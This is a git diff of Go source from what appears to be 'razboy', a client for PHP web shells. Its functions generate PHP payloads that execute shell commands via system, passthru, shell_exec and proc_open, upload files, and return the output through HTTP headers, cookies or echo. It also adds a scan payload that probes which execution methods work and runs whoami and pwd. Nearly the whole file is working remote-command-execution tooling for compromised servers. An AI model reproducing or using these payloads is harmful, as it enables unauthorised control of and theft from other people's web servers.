@@ -1,6 +1,8 @@
-package phpadapter
+package razboy
 
-import "github.com/eatbytes/razboy/normalizer"
+func _getPassthruCMD(cmd, letter string) string {
+	return "ob_start();passthru('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
+}
 
 func _getSystemCMD(cmd, letter string) string {
 	return "ob_start();system('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
@@ -43,22 +45,15 @@ func CreateCMD(cmd, scope, method string) string {
 	switch method {
 	case "shell_exec":
 		shellCMD = _getShellExecCMD(shellCMD, "r")
-	case "proc":
+	case "proc_open":
 		shellCMD = _getProcOpenCMD(cmd, scope, "/bin/sh", "r")
+	case "passthru":
+		shellCMD = _getPassthruCMD(shellCMD, "r")
 	default:
 		shellCMD = _getSystemCMD(shellCMD, "r")
 	}
 
 	return shellCMD
-}
-
-func CreateCD(cmd, scope, method string) string {
-	var cd string
-
-	cd = cmd + " && pwd"
-	cd = CreateCMD(cd, scope, method)
-
-	return cd
 }
 
 func CreateDownload(dir string) string {
@@ -81,29 +76,26 @@ func CreateDownload(dir string) string {
 
 func CreateUpload(dir string) string {
 	return "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');" +
-		"if(file_exists('" + dir + "')){echo(" + normalizer.PHPEncode("1") + ");}"
+		"if(file_exists('" + dir + "')){echo(" + PHPEncode("1") + ");}"
 }
 
-func CreateListFile(scope string) string {
-	return "$r=implode('\n', scandir(" + scope + "));"
+func CreateScan() string {
+	return `ob_start();system("echo 1;");$r["S"]["sy"]=trim(ob_get_contents());ob_end_clean();
+$r["S"]["sh"]=trim(shell_exec("echo 1;"));$r["I"]["w"]=trim(shell_exec("whoami;"));$r["I"]["p"]=trim(shell_exec("pwd;"));
+ob_start();passthru("echo 1;");$r["S"]["pa"]=trim(ob_get_contents());ob_end_clean();
+$opt=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe', 'w'));$proc=proc_open("/bin/sh", $opt, $pipes, "./");
+if(is_resource($proc)){fwrite($pipes[0], "echo 1;");fclose($pipes[0]);$s=stream_get_contents($pipes[1]);$e=stream_get_contents($pipes[2]);proc_close($proc);if($e===""){$r["S"]["pr"]=trim($s);}}
+$r=json_encode($r);`
 }
 
-func CreateReadFile(file string) string {
-	return "$r=file_get_contents('" + file + "');"
-}
-
-func CreateDelete(scope string) string {
-	return "if(is_dir('" + scope + "')){$r=rmdir('" + scope + "');}else{$r=unlink('" + scope + "');}"
-}
-
-func CreateAnswer(method, parameter string) string {
+func AddAnswer(method, parameter string) string {
 	if method == "HEADER" {
-		return "header('" + parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
+		return "header('" + parameter + ":' . " + PHPEncode("$r") + ");exit();"
 	}
 
 	if method == "COOKIE" {
-		return "setcookie('" + parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
+		return "setcookie('" + parameter + "', " + PHPEncode("$r") + ");exit();"
 	}
 
-	return "echo(" + normalizer.PHPEncode("$r") + ");exit();"
+	return "echo(" + PHPEncode("$r") + ");exit();"
 }
